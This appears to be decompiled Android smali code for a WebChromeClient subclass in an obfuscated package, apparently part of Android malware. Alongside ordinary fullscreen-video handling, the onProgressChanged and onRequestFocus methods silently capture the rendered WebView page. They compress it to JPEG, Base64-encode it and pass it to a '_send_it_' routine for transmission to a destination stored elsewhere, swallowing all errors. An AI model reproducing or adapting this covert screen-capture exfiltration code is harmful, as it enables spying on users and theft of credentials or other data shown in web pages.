.class Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;
.super Landroid/webkit/WebChromeClient;
.source "lkefofrxugzxhovsgnspbjuhn14.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "MyChrome"
.end annotation


# instance fields
.field private mCustomView:Landroid/view/View;

.field private mCustomViewCallback:Landroid/webkit/WebChromeClient$CustomViewCallback;

.field protected mFullscreenContainer:Landroid/widget/FrameLayout;

.field private mOriginalOrientation:I

.field private mOriginalSystemUiVisibility:I

.field final synthetic this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;


# direct methods
.method constructor <init>(Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;)V
    .locals 0

    .line 46
    iput-object p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-direct {p0}, Landroid/webkit/WebChromeClient;-><init>()V

    return-void
.end method


# virtual methods
.method public getDefaultVideoPoster()Landroid/graphics/Bitmap;
    .locals 2

    .line 50
    iget-object v0, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomView:Landroid/view/View;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return-object v0

    .line 53
    :cond_0
    iget-object v0, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-virtual {v0}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v1, 0x7f020045

    invoke-static {v0, v1}, Landroid/graphics/BitmapFactory;->decodeResource(Landroid/content/res/Resources;I)Landroid/graphics/Bitmap;

    move-result-object v0

    return-object v0
.end method

.method public onHideCustomView()V
    .locals 3

    .line 58
    iget-object v0, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-virtual {v0}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->getWindow()Landroid/view/Window;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/FrameLayout;

    iget-object v1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomView:Landroid/view/View;

    invoke-virtual {v0, v1}, Landroid/widget/FrameLayout;->removeView(Landroid/view/View;)V

    const/4 v0, 0x0

    .line 59
    iput-object v0, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomView:Landroid/view/View;

    .line 60
    iget-object v1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-virtual {v1}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->getWindow()Landroid/view/Window;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object v1

    iget v2, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mOriginalSystemUiVisibility:I

    invoke-virtual {v1, v2}, Landroid/view/View;->setSystemUiVisibility(I)V

    .line 61
    iget-object v1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    iget v2, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mOriginalOrientation:I

    invoke-virtual {v1, v2}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->setRequestedOrientation(I)V

    .line 62
    iget-object v1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomViewCallback:Landroid/webkit/WebChromeClient$CustomViewCallback;

    invoke-interface {v1}, Landroid/webkit/WebChromeClient$CustomViewCallback;->onCustomViewHidden()V

    .line 63
    iput-object v0, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomViewCallback:Landroid/webkit/WebChromeClient$CustomViewCallback;

    return-void
.end method

.method public onProgressChanged(Landroid/webkit/WebView;I)V
    .locals 2

    .line 83
    invoke-super {p0, p1, p2}, Landroid/webkit/WebChromeClient;->onProgressChanged(Landroid/webkit/WebView;I)V

    .line 86
    :try_start_0
    invoke-virtual {p1}, Landroid/webkit/WebView;->capturePicture()Landroid/graphics/Picture;

    move-result-object p1

    .line 88
    invoke-virtual {p1}, Landroid/graphics/Picture;->getWidth()I

    move-result p2

    invoke-virtual {p1}, Landroid/graphics/Picture;->getHeight()I

    move-result v0

    sget-object v1, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    .line 87
    invoke-static {p2, v0, v1}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object p2

    .line 89
    new-instance v0, Landroid/graphics/Canvas;

    invoke-direct {v0, p2}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 90
    invoke-virtual {p1, v0}, Landroid/graphics/Picture;->draw(Landroid/graphics/Canvas;)V

    .line 95
    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 96
    sget-object v0, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v1, 0x32

    invoke-virtual {p2, v0, v1, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 97
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    const/4 p2, 0x0

    .line 98
    invoke-static {p1, p2}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p1

    .line 99
    sget-object p2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->wbvew:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {p2, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->_send_it_(Ljava/lang/String;[B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public onRequestFocus(Landroid/webkit/WebView;)V
    .locals 3

    .line 109
    invoke-super {p0, p1}, Landroid/webkit/WebChromeClient;->onRequestFocus(Landroid/webkit/WebView;)V

    .line 113
    :try_start_0
    invoke-virtual {p1}, Landroid/webkit/WebView;->capturePicture()Landroid/graphics/Picture;

    move-result-object p1

    .line 115
    invoke-virtual {p1}, Landroid/graphics/Picture;->getWidth()I

    move-result v0

    invoke-virtual {p1}, Landroid/graphics/Picture;->getHeight()I

    move-result v1

    sget-object v2, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    .line 114
    invoke-static {v0, v1, v2}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 116
    new-instance v1, Landroid/graphics/Canvas;

    invoke-direct {v1, v0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 117
    invoke-virtual {p1, v1}, Landroid/graphics/Picture;->draw(Landroid/graphics/Canvas;)V

    .line 122
    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 123
    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v2, 0x32

    invoke-virtual {v0, v1, v2, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 124
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    const/4 v0, 0x0

    .line 125
    invoke-static {p1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p1

    .line 126
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->wbvew:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v0, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->_send_it_(Ljava/lang/String;[B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public onShowCustomView(Landroid/view/View;Landroid/webkit/WebChromeClient$CustomViewCallback;)V
    .locals 2

    .line 68
    iget-object v0, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomView:Landroid/view/View;

    if-eqz v0, :cond_0

    .line 70
    invoke-virtual {p0}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->onHideCustomView()V

    return-void

    .line 73
    :cond_0
    iput-object p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomView:Landroid/view/View;

    .line 74
    iget-object p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-virtual {p1}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/View;->getSystemUiVisibility()I

    move-result p1

    iput p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mOriginalSystemUiVisibility:I

    .line 75
    iget-object p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-virtual {p1}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->getRequestedOrientation()I

    move-result p1

    iput p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mOriginalOrientation:I

    .line 76
    iput-object p2, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomViewCallback:Landroid/webkit/WebChromeClient$CustomViewCallback;

    .line 77
    iget-object p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-virtual {p1}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/FrameLayout;

    iget-object p2, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->mCustomView:Landroid/view/View;

    new-instance v0, Landroid/widget/FrameLayout$LayoutParams;

    const/4 v1, -0x1

    invoke-direct {v0, v1, v1}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    invoke-virtual {p1, p2, v0}, Landroid/widget/FrameLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 78
    iget-object p1, p0, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14$MyChrome;->this$0:Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;

    invoke-virtual {p1}, Lginom/alfa/lib/scan/lkefofrxugzxhovsgnspbjuhn14;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    const/16 p2, 0xf06

    invoke-virtual {p1, p2}, Landroid/view/View;->setSystemUiVisibility(I)V

    return-void
.end method
